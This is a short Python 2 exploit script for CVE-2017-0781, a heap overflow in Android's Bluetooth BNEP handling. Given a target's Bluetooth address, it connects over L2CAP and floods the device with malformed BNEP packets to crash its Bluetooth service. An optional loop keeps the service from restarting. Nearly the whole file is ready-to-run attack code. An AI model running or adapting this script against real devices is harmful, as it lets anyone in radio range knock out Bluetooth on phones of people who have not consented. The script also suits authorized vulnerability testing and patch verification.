#!/usr/bin/env python2

"""
This script uses the CVE-2017-0781 RCE to crash the Bluetooth service
of a target Android device.

Requires the following packages not included in standard Python distributions:
    - pwn
    - pybluez
"""

import sys
import re
import time
import bluetooth as bt
import pwn
from argparse import ArgumentParser

pwn.context.arch = "arm"
TARGET_RE = re.compile("([a-f0-9]{2}:){5}([a-f0-9]{2})", flags=re.IGNORECASE)
BNEP_PSM = 0xF
BNEP_FRAME_CONTROL = 0x01
BNEP_SETUP_CONN_REQ_MSG = 0x01


def construct_packet(content):
    """
    Constructs a valid BNEP control package with `content` as payload that triggers
    the buffer overflow on the heap.

    Params:
        - `content` - The actual data to pack in the BNEP package

    Returns:
        A valid BNEP package that contains `content` and triggers the vulnerability
    """
    pkt = "" + pwn.p8(BNEP_FRAME_CONTROL | 128)
    pkt += pwn.p8(BNEP_SETUP_CONN_REQ_MSG) + "\x00" + content
    return pkt


if __name__ == "__main__":
    parser = ArgumentParser()
    parser.add_argument("TARGET", action="store", type=str, help="Bluetooth address of the target device")
    parser.add_argument("-l", "--loop", action="store_true", required=False, help="Loop sending the payload to prevent target from restarting Bluetooth service")
    args = parser.parse_args()

    if not TARGET_RE.match(args.TARGET):
        sys.exit("Argument TARGET needs to be of the form XX:XX:XX:XX:XX:XX where X is a hexadecimal character!")

    # Construct package to overflow with invalid pointers
    payload = construct_packet("AAAABBBB")

    pwn.log.info("Connecting to L2CAP socket...")
    # Create a low level L2CAP socket and set MTU
    socket = bt.BluetoothSocket(bt.L2CAP)
    bt.set_l2cap_mtu(socket, 1500)

    try:
        # Connect via BNEP
        socket.connect((args.TARGET, BNEP_PSM))
        pwn.log.info("Sending BNEP payload...")

        # Send packages to overflow buffer and loop sending if desired
        run = True
        while run:
            for i in range(30):
                socket.send(payload)
            # time.sleep(1)
            run = args.loop
        pwn.log.success("Crashed bluetooth service")
    except bt.btcommon.BluetoothError as e:
        pwn.log.failure("An error occurred sending the packages: %s" % (e,))
    except KeyboardInterrupt:
        pwn.log.info("Terminated by user.")

    socket.close()
    pwn.log.success("Done")
